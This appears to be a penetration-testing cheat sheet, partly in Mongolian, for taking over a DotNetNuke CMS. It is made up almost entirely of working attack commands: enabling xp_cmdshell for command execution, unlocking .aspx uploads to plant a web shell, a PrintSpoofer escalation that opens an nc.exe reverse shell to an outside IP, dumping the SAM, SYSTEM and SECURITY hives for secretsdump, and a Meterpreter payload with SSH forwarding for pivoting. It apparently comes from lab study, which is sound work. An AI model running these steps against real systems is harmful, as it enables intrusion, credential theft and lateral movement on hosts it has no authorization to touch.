# DNN (DotNetNuke)

## Configuration file

`web.config`

## Option A: SQL Console RCE (xp_cmdshell)

DNN Settings цэс доторх SQL console:

```sql
EXEC sp_configure 'show advanced options', '1'; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', '1'; RECONFIGURE;

EXEC xp_cmdshell 'whoami';
```

## Option B: Web Shell Upload

1. **Path:** `Settings -> Security -> More -> More Security Settings`
2. **Action:** Add `.asp, .aspx, .exe` to `Allowable File Extensions`
3. **Upload:** `Manage -> Site Assets` to upload ASPX shell

## Privilege Escalation: SYSTEM Access

Check `whoami /priv` for **SeImpersonatePrivilege**, then:

- **Tools needed:** `PrintSpoofer.exe`, `nc.exe`
- **Transfer:** DNN File Manager to `c:\DotNetNuke\Portals\0\`

```bash
EXEC xp_cmdshell 'c:\DotNetNuke\Portals\0\PrintSpoofer.exe -c "c:\DotNetNuke\Portals\0\nc.exe 172.16.8.120 443 -e cmd"';
```

## Dump SAM Database

```bash
EXEC xp_cmdshell 'c:\DotNetNuke\Portals\0\PrintSpoofer.exe -c "reg save HKLM\SYSTEM c:\DotNetNuke\Portals\0\SYSTEM.SAVE"';
EXEC xp_cmdshell 'c:\DotNetNuke\Portals\0\PrintSpoofer.exe -c "reg save HKLM\SECURITY c:\DotNetNuke\Portals\0\SECURITY.SAVE"';
EXEC xp_cmdshell 'c:\DotNetNuke\Portals\0\PrintSpoofer.exe -c "reg save HKLM\SAM c:\DotNetNuke\Portals\0\SAM.SAVE"';
```

Modify allowed file extensions to permit `.SAVE` download, then use secretsdump:

```bash
impacket-secretsdump LOCAL -system SYSTEM.SAVE -sam SAM.SAVE -security SECURITY.SAVE LOCAL
```

## Pivoting: Reverse Port Forwarding (Metasploit)

**1. MSFVenom Payload:**

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.8.120 LPORT=443 -f exe -o teams.exe
```

**2. SSH Remote Forwarding:**

```bash
ssh -i dmz01_key -R 172.16.8.120:443:127.0.0.1:7000 root@10.129.203.111
```

**3. Metasploit Handler:**

```
set payload windows/x64/meterpreter/reverse_https
set LPORT 7000
set LHOST 0.0.0.0
exploit
```
